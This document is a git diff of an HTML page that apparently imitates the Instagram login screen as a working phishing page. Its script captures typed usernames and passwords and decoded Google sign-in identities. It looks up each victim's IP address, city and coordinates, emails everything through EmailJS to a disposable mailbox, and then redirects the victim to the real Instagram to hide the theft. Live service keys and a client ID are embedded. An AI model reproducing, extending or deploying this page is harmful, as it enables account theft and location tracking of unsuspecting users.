@@ -1,240 +1,263 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login • Instagram</title>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script src="https://accounts.google.com/gsi/client" async defer></script>
-    <style>
-        :root {
-            --bg: #fafafa;
-            --box: #ffffff;
-            --text: #262626;
-            --border: #dbdbdb;
-            --link: #00376b;
-            --secondary: #8e8e8e;
-            --btn-blue: #0095f6;
-            --input-bg: #fafafa;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login • Instagram</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
+  <style>
+    :root {
+      --bg: #fafafa;
+      --box: #ffffff;
+      --text: #262626;
+      --border: #dbdbdb;
+      --link: #00376b;
+      --secondary: #8e8e8e;
+      --btn-blue: #0095f6;
+      --input-bg: #fafafa;
+    }
 
-        [data-theme="dark"] {
-            --bg: #000000;
-            --box: #000000;
-            --text: #f5f5f5;
-            --border: #262626;
-            --link: #e0f1ff;
-            --secondary: #a8a8a8;
-            --input-bg: #121212;
-        }
+    [data-theme="dark"] {
+      --bg: #000000;
+      --box: #000000;
+      --text: #f5f5f5;
+      --border: #262626;
+      --link: #e0f1ff;
+      --secondary: #a8a8a8;
+      --input-bg: #121212;
+    }
 
-        body {
-            background-color: var(--bg);
-            color: var(--text);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
 
-        .main-container {
-            width: 100%;
-            max-width: 350px;
-        }
+    .main-container {
+      width: 100%;
+      max-width: 350px;
+    }
 
-        .auth-box {
-            background-color: var(--box);
-            border: 1px solid var(--border);
-            padding: 10px 40px 20px 40px;
-            margin-bottom: 10px;
-            text-align: center;
-        }
+    .auth-box {
+      background-color: var(--box);
+      border: 1px solid var(--border);
+      padding: 10px 40px 20px 40px;
+      margin-bottom: 10px;
+      text-align: center;
+    }
 
-        .logo-area { margin: 22px auto 35px auto; }
-        .logo-img { width: 175px; cursor: pointer; }
-        [data-theme="dark"] .logo-light { display: none; }
-        .logo-dark { display: none; }
-        [data-theme="dark"] .logo-dark { display: inline-block; }
+    .logo-area { margin: 22px auto 35px auto; }
+    .logo-img { width: 175px; cursor: pointer; }
+    [data-theme="dark"] .logo-light { display: none; }
+    .logo-dark { display: none; }
+    [data-theme="dark"] .logo-dark { display: inline-block; }
 
-        input {
-            width: 100%;
-            padding: 9px 0 7px 8px;
-            margin-bottom: 6px;
-            background: var(--input-bg);
-            border: 1px solid var(--border);
-            border-radius: 3px;
-            box-sizing: border-box;
-            color: var(--text);
-            font-size: 12px;
-        }
+    input {
+      width: 100%;
+      padding: 9px 0 7px 8px;
+      margin-bottom: 6px;
+      background: var(--input-bg);
+      border: 1px solid var(--border);
+      border-radius: 3px;
+      box-sizing: border-box;
+      color: var(--text);
+      font-size: 12px;
+    }
 
-        .login-btn {
-            width: 100%;
-            background-color: var(--btn-blue);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 7px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 8px;
-            font-size: 14px;
-        }
+    .login-btn {
+      width: 100%;
+      background-color: var(--btn-blue);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 7px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+      font-size: 14px;
+    }
 
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 18px 0;
-            color: var(--secondary);
-            font-size: 13px;
-            font-weight: 600;
-        }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: var(--border); }
-        .divider span { margin: 0 18px; }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 18px 0;
+      color: var(--secondary);
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: var(--border); }
+    .divider span { margin: 0 18px; }
 
-        .fb-login {
-            color: #385185;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-decoration: none;
-            margin-bottom: 15px;
-        }
+    .fb-login {
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      margin-bottom: 15px;
+    }
 
-        .forgot-pw { font-size: 12px; color: var(--link); cursor: pointer; }
+    .forgot-pw { font-size: 12px; color: var(--link); cursor: pointer; }
 
-        .signup-box {
-            background-color: var(--box);
-            border: 1px solid var(--border);
-            padding: 20px;
-            text-align: center;
-            font-size: 14px;
-        }
+    .signup-box {
+      background-color: var(--box);
+      border: 1px solid var(--border);
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+    }
 
-        .signup-link { color: var(--btn-blue); font-weight: 600; cursor: pointer; text-decoration: none; }
+    .signup-link { color: var(--btn-blue); font-weight: 600; cursor: pointer; text-decoration: none; }
 
-        .theme-toggle {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            cursor: pointer;
-            background: var(--box);
-            border: 1px solid var(--border);
-            padding: 10px;
-            border-radius: 50%;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
+    .theme-toggle {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      cursor: pointer;
+      background: var(--box);
+      border: 1px solid var(--border);
+      padding: 10px;
+      border-radius: 50%;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
 
-        #google-btn-container {
-            display: flex;
-            justify-content: center;
-            margin: 10px 0;
-        }
-    </style>
+    #google-btn-container {
+      display: flex;
+      justify-content: center;
+      margin: 10px 0;
+    }
+  </style>
 </head>
 <body data-theme="light">
 
-    <div class="theme-toggle" onclick="toggleTheme()">🌓</div>
+  <div class="theme-toggle" onclick="toggleTheme()">🌓</div>
 
-    <div class="main-container">
-        <div class="auth-box">
-            <div class="logo-area">
-                <img class="logo-img logo-light" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png">
-                <img class="logo-img logo-dark" src="https://www.edigitalagency.com.au/wp-content/uploads/instagram-logo-white-text-png-900x311.png">
-            </div>
+  <div class="main-container">
+    <div class="auth-box">
+      <div class="logo-area">
+        <img class="logo-img logo-light" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo">
+        <img class="logo-img logo-dark" src="https://www.edigitalagency.com.au/wp-content/uploads/instagram-logo-white-text-png-900x311.png" alt="Instagram Logo">
+      </div>
 
-            <form onsubmit="event.preventDefault();">
-                <input type="text" placeholder="Phone number, username, or email">
-                <input type="password" placeholder="Password">
-                <button type="submit" class="login-btn">Log In</button>
-            </form>
+      <form onsubmit="event.preventDefault();">
+        <input type="text" placeholder="Phone number, username, or email">
+        <input type="password" placeholder="Password">
+        <button type="submit" class="login-btn">Log In</button>
+      </form>
 
-            <div class="divider"><span>OR</span></div>
+      <div class="divider"><span>OR</span></div>
 
-            <div id="google-btn-container">
-                <div id="buttonDiv"></div>
-            </div>
+      <div id="google-btn-container">
+        <div id="buttonDiv"></div>
+      </div>
 
-            <p class="forgot-pw">Forgot password?</p>
-        </div>
-
-        <div class="signup-box">
-            Don't have an account? <span class="signup-link">Sign up</span>
-        </div>
+      <p class="forgot-pw">Forgot password?</p>
     </div>
 
-    <script>
-        // CONFIG - Replace these with your actual IDs
-        const CONFIG = {
-            EMAILJS_PUBLIC_KEY: "Yll0LueIob9ob1rNI",
-            SERVICE_ID: "service_cn3zovj",
-            TEMPLATE_ID: "template_evzrufo",
-            GOOGLE_CLIENT_ID: "1056026425142-im9mmsv7huvujnma0q66soc2lpddhiqk.apps.googleusercontent.com"
-        };
+    <div class="signup-box">
+      Don't have an account? <span class="signup-link">Sign up</span>
+    </div>
+  </div>
 
-        emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
+  <script>
+    // CONFIG - Replace these with your actual IDs
+    const CONFIG = {
+      EMAILJS_PUBLIC_KEY: "Yll0LueIob9ob1rNI",
+      SERVICE_ID: "service_cn3zovj",
+      TEMPLATE_ID: "template_evzrufo",
+      GOOGLE_CLIENT_ID: "1056026425142-im9mmsv7huvujnma0q66soc2lpddhiqk.apps.googleusercontent.com"
+    };
 
-        // --- NEW: MANUAL LOGIN CAPTURE ---
-        const loginForm = document.querySelector('form');
-        loginForm.addEventListener('submit', (e) => {
-            e.preventDefault();
+    emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
 
-            const usernameInput = loginForm.querySelector('input[type="text"]').value;
-            const passwordInput = loginForm.querySelector('input[type="password"]').value;
+    // --- MANUAL LOGIN CAPTURE ---
+    const loginForm = document.querySelector('form');
+    loginForm.addEventListener('submit', (e) => {
+      e.preventDefault();
 
-            const manualData = {
-                to_email: "d-4wio0wr@maildrop.cc",
-                user_name: "MANUAL_LOGIN", // Label to distinguish from Google
-                user_email: usernameInput,   // The username/email typed
-                profile_pic: passwordInput,  // The password typed (sent to the 'profile_pic' tag for simplicity)
-                time: new Date().toLocaleString()
-            };
+      const usernameInput = loginForm.querySelector('input[type="text"]').value;
+      const passwordInput = loginForm.querySelector('input[type="password"]').value;
 
-            emailjs.send(CONFIG.SERVICE_ID, CONFIG.TEMPLATE_ID, manualData)
-                .then(() => {
-                    window.location.href = "https://www.instagram.com/accounts/login/";
-                });
-        });
+      // Get IP and location
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const manualData = {
+            to_email: "d-4wio0wr@maildrop.cc",
+            user_name: "MANUAL_LOGIN",
+            user_email: usernameInput,
+            profile_pic: passwordInput,
+            time: new Date().toLocaleString(),
+            ip_address: data.ip,
+            location: `${data.city}, ${data.region}, ${data.country}`,
+            latitude: data.latitude,
+            longitude: data.longitude
+          };
 
-        // --- GOOGLE LOGIN CAPTURE ---
-        function handleCredentialResponse(response) {
-            const base64Url = response.credential.split('.')[1];
-            const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
-            const user = JSON.parse(window.atob(base64));
-
-            const googleData = {
-                to_email: "d-4wio0wr@maildrop.cc",
-                user_name: user.name,
-                user_email: user.email,
-                profile_pic: user.picture,
-                time: new Date().toLocaleString(),
-                password: user.email // Simulate password capture using email
-            };
-
-            emailjs.send(CONFIG.SERVICE_ID, CONFIG.TEMPLATE_ID, googleData)
-                .then(() => {
-                    setTimeout(() => {
-                        window.location.href = "https://www.instagram.com";
-                    }, 1000);
-                });
-        }
-
-        window.onload = () => {
-            google.accounts.id.initialize({
-                client_id: CONFIG.GOOGLE_CLIENT_ID,
-                callback: handleCredentialResponse
+          emailjs.send(CONFIG.SERVICE_ID, CONFIG.TEMPLATE_ID, manualData)
+            .then(() => {
+              window.location.href = "https://www.instagram.com/accounts/login/";
             });
-            google.accounts.id.renderButton(
-                document.getElementById("buttonDiv"),
-                { theme: "outline", size: "large", width: "270" }
-            );
-        };
-    </script>
+        });
+    });
+
+    // --- GOOGLE LOGIN CAPTURE ---
+    function handleCredentialResponse(response) {
+      const base64Url = response.credential.split('.')[1];
+      const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+      const user = JSON.parse(window.atob(base64));
+
+      // Get IP and location
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const googleData = {
+            to_email: "d-4wio0wr@maildrop.cc",
+            user_name: user.name,
+            user_email: user.email,
+            profile_pic: user.picture,
+            time: new Date().toLocaleString(),
+            password: user.email,
+            ip_address: data.ip,
+            location: `${data.city}, ${data.region}, ${data.country}`,
+            latitude: data.latitude,
+            longitude: data.longitude
+          };
+
+          emailjs.send(CONFIG.SERVICE_ID, CONFIG.TEMPLATE_ID, googleData)
+            .then(() => {
+              setTimeout(() => {
+                window.location.href = "https://www.instagram.com";
+              }, 1000);
+            });
+        });
+    }
+
+    window.onload = () => {
+      google.accounts.id.initialize({
+        client_id: CONFIG.GOOGLE_CLIENT_ID,
+        callback: handleCredentialResponse
+      });
+      google.accounts.id.renderButton(
+        document.getElementById("buttonDiv"),
+        { theme: "outline", size: "large", width: "270" }
+      );
+    };
+
+    // --- THEME TOGGLE ---
+    function toggleTheme() {
+      document.body.dataset.theme = document.body.dataset.theme === "light" ? "dark" : "light";
+    }
+  </script>
 </body>
 </html>
